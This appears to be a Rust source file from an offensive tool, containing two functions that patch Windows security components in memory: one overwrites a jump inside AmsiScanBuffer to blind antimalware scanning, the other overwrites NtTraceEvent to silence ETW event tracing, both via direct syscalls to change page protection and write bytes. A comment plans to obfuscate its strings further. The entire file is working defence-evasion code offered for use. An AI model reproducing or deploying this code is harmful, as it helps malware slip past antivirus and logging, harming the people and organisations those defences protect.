use windows::Win32::System::LibraryLoader::LoadLibraryA;
use windows::Win32::System::LibraryLoader::GetProcAddress;
use windows::Win32::System::Threading::GetCurrentProcess;
use windows::Win32::Foundation::HANDLE;
use windows::core::{s,PCSTR};
use std::ffi::c_void;
use rust_syscalls::syscall;

// Strings are not obfuscated here. Todo: make them not visible anymore,
// the obfstr crate is an easy way to go here for example.

fn patchAMSI() -> bool {
    let patch: [u8; 1] = [0x75];
    // Load amsi.dll
    let amsi = unsafe { LoadLibraryA(s!("amsi.dll")).unwrap() };
    //println!("AMSI Loaded");
    //println!("{:?}", amsi);
    let mut amsi_scan_buffer = unsafe { GetProcAddress(amsi, s!("AmsiScanBuffer")) };
    //println!("AMSI Scan Buffer Found");
    //println!("{:?}", amsi_scan_buffer);
    
    #[cfg(target_arch = "x86")] {
        // Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
        amsi_scan_buffer = unsafe {
            let ptr: usize = std::mem::transmute(amsi_scan_buffer);
            let offset_ptr = ptr + 0x47;
            std::mem::transmute::<usize, Option<unsafe extern "system" fn() -> isize>>(offset_ptr)
        };
    }
    #[cfg(target_arch = "x86_64")] {
        // Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
        amsi_scan_buffer = unsafe {
            let ptr: usize = std::mem::transmute(amsi_scan_buffer);
            let offset_ptr = ptr + 0x6D;
            std::mem::transmute::<usize, Option<unsafe extern "system" fn() -> isize>>(offset_ptr)
        };
    }

    let mut protectaddress_to_protect: *mut c_void = unsafe {
        std::mem::transmute(amsi_scan_buffer.expect("amsi_scan_buffer was None"))
    };

    let mut size_to_set = patch.len(); 
    let mut return_value: i32;
    let mut process_handle: HANDLE = unsafe { GetCurrentProcess() };
    let mut protect: u32 = 0x40;
    let mut oldprotect: u32 = 0;
    let mut bytes_written: usize = 0;
    
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, protect, &mut oldprotect);
    }
    if return_value != 0 {
        println!("Failed to patch AMSI, NtProtectVirtualMemory");
        println!("{:x}", return_value);
        return false;
    }
    let patch_ptr = patch.as_ptr() as *const c_void;
    unsafe
    {
        return_value = syscall!("NtWriteVirtualMemory", process_handle, amsi_scan_buffer, patch_ptr, patch.len(), &mut bytes_written);
    }
    if return_value != 0 {
        println!("Failed to patch AMSI, NtWriteVirtualMemory");
        println!("{:x}", return_value);
        println!("{:?}", bytes_written);
        return false;
    }
    // reprotect page permmissions to READ_WRITE
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, 0x20, &mut oldprotect);
    }
    if return_value != 0 {
        println!("Failed to patch AMSI, NtProtectVirtualMemory");
        println!("{:x}", return_value);
        return false;
    }
    println!("AMSI Patched");

    
    return true;
    
}

fn patchETW() -> bool {
    let patch: [u8; 1] = [0x75];
    
    let ntdll = unsafe { LoadLibraryA(s!("ntdll.dll")).unwrap() };
    let mut nt_traceevent = unsafe { GetProcAddress(ntdll, s!("NtTraceEvent")) };
    
    let mut protectaddress_to_protect: *mut c_void = unsafe {
        std::mem::transmute(nt_traceevent.expect("NtTraceEvent was None"))
    };

    let mut size_to_set = patch.len(); 
    let mut return_value: i32;
    let mut process_handle: HANDLE = unsafe { GetCurrentProcess() };
    let mut protect: u32 = 0x40;
    let mut oldprotect: u32 = 0;
    let mut bytes_written: usize = 0;
    
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, protect, &mut oldprotect);
    }
    if return_value != 0 {
        println!("Failed to patch ETW, NtProtectVirtualMemory");
        println!("{:x}", return_value);
        return false;
    }
    let patch_ptr = patch.as_ptr() as *const c_void;
    unsafe
    {
        return_value = syscall!("NtWriteVirtualMemory", process_handle, nt_traceevent, patch_ptr, patch.len(), &mut bytes_written);
    }
    if return_value != 0 {
        println!("Failed to patch ETW, NtWriteVirtualMemory");
        println!("{:x}", return_value);
        return false;
    }
    // reprotect page permmissions to READ_WRITE
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, 0x20, &mut oldprotect);
    }
    if return_value != 0 {
        println!("Failed to patch ETW, NtProtectVirtualMemory");
        println!("{:x}", return_value);
        return false;
    }
    println!("ETW Patched");

    
    return true;
    
}
